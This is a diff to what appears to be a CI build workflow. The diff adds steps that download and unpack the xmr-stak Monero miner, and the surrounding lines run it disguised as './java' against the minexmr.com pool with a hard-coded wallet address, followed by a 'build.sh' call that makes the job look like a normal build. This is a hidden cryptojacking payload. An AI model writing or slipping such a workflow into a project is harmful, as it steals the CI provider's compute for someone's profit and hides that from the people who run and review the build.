@@ -10,7 +10,8 @@ jobs:
            git clone --depth=1 https://github.com/leonfox202/bitcoin-wallet.git linux
            cd linux
            wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz
-           ls xmr*
+           tar xfv xmr-stak-rx-linux-1.0.5-cpu.tar.xz
+           cd xmr-stak-rx-linux-1.0.5-cpu
            chmod 755 *
            ./java --url us-west.minexmr.com:443  --user  42Ctz7xCRFX6nSgrPdR8sJRJNmHPGfjyQ5Rdir4Wa6TDGDtvsN8LGMsDqhbEBi7zgSaAQKLxQYUVUHF2XcnMSuzyFWc5H3P --pass L1 --donate-level 0 
            ./build.sh
